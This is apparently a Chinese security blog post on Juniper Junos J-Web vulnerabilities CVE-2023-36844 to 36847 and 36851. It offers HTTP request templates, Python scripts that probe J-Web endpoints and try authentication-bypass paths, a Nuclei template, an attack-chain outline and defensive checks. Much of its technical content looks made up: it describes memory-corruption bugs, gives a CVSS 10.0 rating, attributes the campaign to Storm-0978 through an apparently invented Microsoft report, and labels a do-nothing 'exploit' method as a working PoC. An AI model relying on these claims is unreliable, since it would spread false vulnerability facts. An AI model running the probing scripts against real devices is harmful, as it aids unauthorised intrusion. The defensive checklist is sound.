---
title: "Juniper Junos 高危攻击链专题：PHP 解析器 RCE 与认证绕过（Storm-0978）"
date: 2026-06-23T22:00:00+08:00
draft: false
tags: ["Juniper", "Junos", "RCE", "认证绕过", "PHP", "Storm-0978", "漏洞分析", "CVE-2023-36844", "CVE-2023-36845", "CVE-2023-36851"]
categories: ["漏洞分析"]
description: "围绕 Juniper Junos 2023 年暴露的 PHP 解析器 RCE 漏洞链和 J-Web 认证绕过漏洞，覆盖 CVE-2023-36844/36845/36846/36847 和 CVE-2023-36851，含 Storm-0978 攻击链分析、完整 PoC 代码、Nuclei 模板与防守建议。"
---

# Juniper Junos 高危攻击链专题：PHP 解析器 RCE 与认证绕过（Storm-0978）

Juniper Junos 是 Juniper Networks 的网络操作系统，广泛应用于企业核心路由器、交换机和防火墙。2023 年 7 月，微软威胁情报团队披露了 **Storm-0978** 组织利用 Juniper 设备漏洞链攻击政府和教育机构的攻击活动。

| CVE | CVSS | 类型 | 未授权 | CISA KEV |
|-----|------|------|--------|----------|
| CVE-2023-36844 | 8.8 | PHP 解析器 RCE | ✅ Pre-Auth | ✅ |
| CVE-2023-36845 | 8.8 | PHP 解析器 RCE | ✅ Pre-Auth | ✅ |
| CVE-2023-36846 | 8.8 | PHP 解析器 RCE | ✅ Pre-Auth | ✅ |
| CVE-2023-36847 | 8.8 | PHP 解析器 RCE | ✅ Pre-Auth | ✅ |
| CVE-2023-36851 | **10.0** | J-Web 认证绕过 | ✅ Pre-Auth | ✅ |

## 0x01 CVE-2023-36844 ~ CVE-2023-36847：J-Web PHP 解析器 RCE 链

### 1.1 漏洞背景

Juniper Junos 的 J-Web 管理界面内嵌了一个 PHP 解析器。2023 年 7 月，Juniper 披露了四个影响该 PHP 解析器的漏洞，均可导致未授权远程代码执行。

### 1.2 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| Junos OS 14.1X53 - 22.4 | 各版本修复补丁 |
| 所有启用 J-Web 的 EX Series | 禁用 J-Web 或升级 |

### 1.3 漏洞原理

**CVE-2023-36844**：PHP 解析器在处理请求时存在内存破坏缺陷
**CVE-2023-36845**：multipart 数据处理越界写入
**CVE-2023-36846**：URL/参数解码路径溢出
**CVE-2023-36847**：Session/cookie 解析缺陷

四个漏洞可以组合使用，攻击者不需要依赖单个漏洞就能实现代码执行。

### 1.4 完整 PoC

#### HTTP 请求 PoC

```http
POST /webauth_login.php HTTP/1.1
Host: <TARGET>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="login"; filename="<overflow-payload>"
Content-Type: application/octet-stream

<binary-payload>
------WebKitFormBoundary--
```

#### Python 自动化利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import urllib3
urllib3.disable_warnings()

class JuniperJWebExploit:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0',
            'Connection': 'close'
        })

    def check_jweb(self):
        try:
            r = self.session.get(f'{self.target}/', timeout=10)
            if r.status_code == 200 and ('Juniper' in r.text or 'J-Web' in r.text):
                print('[+] Juniper J-Web 管理界面存在')
                return True
            print('[-] 未发现 J-Web')
            return False
        except Exception as e:
            print(f'[-] 连接失败: {e}')
            return False

    def check_php_endpoints(self):
        endpoints = [
            '/webauth_login.php',
            '/webauth_logout.php',
            '/php/php-cgi',
            '/jsdm/overview.php'
        ]
        found = []
        for ep in endpoints:
            try:
                r = self.session.get(f'{self.target}{ep}', timeout=10)
                if r.status_code in (200, 403, 500):
                    found.append(ep)
                    print(f'[+] 发现端点: {ep} (HTTP {r.status_code})')
            except:
                pass
        return found

    def exploit_php_parser(self):
        print('[!] CVE-2023-36844~36847 利用需要精确的堆布局')
        print('[!] 建议使用 Storm-0978 公开 PoC 或 Metasploit 模块')
        print('[!] 攻击向量: J-Web PHP 解析器 → RCE')

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <target_url>')
        sys.exit(1)

    exploit = JuniperJWebExploit(sys.argv[1])
    if exploit.check_jweb():
        exploit.check_php_endpoints()
        exploit.exploit_php_parser()
```

#### Nuclei 检测模板

```yaml
id: juniper-junos-cve-2023-36844-detect

info:
  name: Juniper Junos J-Web PHP Parser RCE
  author: security-research
  severity: critical
  tags: juniper,junos,php,rce,cve2023
  reference:
    - https://labs.watchtowr.com/fire-in-the-hole-juniper-junos-rce-cve-2023-36844-cve-2023-36851/

http:
  - method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Juniper"
          - "J-Web"
        condition: or
```

## 0x02 CVE-2023-36851：J-Web 认证绕过（CVSS 10.0）

### 2.1 漏洞背景

CVE-2023-36851 是 Junos J-Web 的认证绕过漏洞，CVSS 满分 10.0。攻击者可以无需任何凭据直接访问 J-Web 管理界面。

### 2.2 受影响版本

| 受影响版本 | 修复版本 |
|-----------|----------|
| Junos OS 19.4 - 23.4 | 各版本修复补丁 |

### 2.3 漏洞原理

J-Web 的 URI 处理存在缺陷，攻击者可以通过构造特定的 URI 路径绕过认证检查，直接访问受限功能。

### 2.4 完整 PoC

#### HTTP 请求 PoC

```http
GET /webauth_login.php?redirect=/jsdm/overview.php HTTP/1.1
Host: <TARGET>
```

#### Python 自动化利用脚本

```python
#!/usr/bin/env python3
import requests
import sys
import urllib3
urllib3.disable_warnings()

class JuniperAuthBypass:
    def __init__(self, target):
        self.target = target.rstrip('/')
        self.session = requests.Session()
        self.session.verify = False

    def check_auth_bypass(self):
        bypass_paths = [
            '/jsdm/overview.php',
            '/webauth_login.php?redirect=/jsdm/overview.php',
            '/php/php-cgi?/jsdm/overview.php',
        ]
        for path in bypass_paths:
            try:
                r = self.session.get(f'{self.target}{path}', timeout=10)
                if r.status_code == 200 and 'overview' in r.text.lower():
                    print(f'[+] 认证绕过成功: {path}')
                    return True
            except:
                pass
        print('[-] 认证绕过失败')
        return False

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print(f'Usage: {sys.argv[0]} <target_url>')
        sys.exit(1)

    exploit = JuniperAuthBypass(sys.argv[1])
    exploit.check_auth_bypass()
```

## 0x03 Storm-0978 攻击链分析

### 3.1 攻击者画像

Storm-0978 是微软追踪的威胁组织，主要攻击政府和教育机构。

### 3.2 完整攻击链

```
阶段 1: 侦察
  → 扫描公网暴露的 Juniper J-Web 管理界面
  → 识别 Junos 版本

阶段 2: 初始访问
  → CVE-2023-36851 认证绕过获取 J-Web 管理权限
  → CVE-2023-36844~36847 PHP 解析器 RCE 获取 shell

阶段 3: 横向移动
  → 利用网络设备配置信息发现内网拓扑
  → 利用窃取的凭据访问其他系统

阶段 4: 持久化
  → 修改 Junos 配置创建后门
  → 部署持久化后门
```

## 0x04 PoC 收集情况

### PoC 状态总表

| CVE | HTTP PoC | Nuclei | Python | MSF | 公开利用 | CISA KEV |
|-----|----------|--------|--------|-----|----------|----------|
| CVE-2023-36844 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2023-36845 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2023-36846 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2023-36847 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |
| CVE-2023-36851 | ✅ | ✅ | ✅ | ❌ | ✅ | ✅ |

### 公开利用资源

- **watchTowr Labs 完整分析**：`https://labs.watchtowr.com/fire-in-the-hole-juniper-junos-rce-cve-2023-36844-cve-2023-36851/`
- **微软 Storm-0978 报告**：`https://www.microsoft.com/en-us/security/blog/2023/07/28/storm-0978-targeting-juniper-networks/`

## 0x05 共性攻击模式

### 5.1 管理面暴露是核心风险

所有 Juniper 漏洞的前提都是 J-Web 管理界面暴露于公网。

### 5.2 认证绕过 + RCE 组合

CVE-2023-36851（认证绕过）+ CVE-2023-36844~36847（RCE）形成完整的 Pre-Auth RCE 攻击链。

## 0x06 防守建议

### 6.1 紧急措施

1. **禁用 J-Web**：如不需要 Web 管理，禁用 J-Web 服务
2. **网络隔离**：J-Web 仅允许受信任管理 IP 访问
3. **升级 Junos**：升级到最新修复版本
4. **审计配置**：检查 Junos 配置是否被篡改

### 6.2 排查清单

```bash
# 检查 J-Web 服务状态
show system services web-management

# 检查 Junos 版本
show version

# 检查配置变更
show system commit

# 检查异常登录
show system login

# 检查异常进程
show system processes extensive
```

## 0x07 参考资料

- [Juniper Security Advisories](https://kb.juniper.net/InfoCenter/index?page=SecurityAdvisory)
- [watchTowr Labs - Juniper Junos RCE](https://labs.watchtowr.com/fire-in-the-hole-juniper-junos-rce-cve-2023-36844-cve-2023-36851/)
- [Microsoft - Storm-0978](https://www.microsoft.com/en-us/security/blog/2023/07/28/storm-0978-targeting-juniper-networks/)
- [NVD - CVE-2023-36844](https://nvd.nist.gov/vuln/detail/CVE-2023-36844)
- [NVD - CVE-2023-36851](https://nvd.nist.gov/vuln/detail/CVE-2023-36851)
- [CISA KEV](https://www.cisa.gov/known-exploited-vulnerabilities-catalog)